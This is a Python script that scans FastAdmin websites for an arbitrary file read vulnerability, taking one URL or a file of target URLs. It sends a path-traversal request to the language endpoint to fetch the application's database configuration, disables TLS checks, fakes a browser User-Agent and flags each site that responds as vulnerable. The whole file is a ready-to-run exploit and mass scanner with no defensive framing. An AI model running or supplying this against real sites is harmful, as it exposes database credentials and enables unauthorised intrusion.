import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,'/index/ajax/lang?lang=../../application/database')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36"
    }
    try:
        response = requests.get(target,headers = headers, verify=False ,allow_redirects=False)
        if response.status_code == 200 and 'jsonpReturn' in response.text and 'type' in response.text:
            print(f"\033[31mDiscovered:{url}: FastAdmin_lang_ArbitraryFileRead!\033[0m")
            return True
    except Exception as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")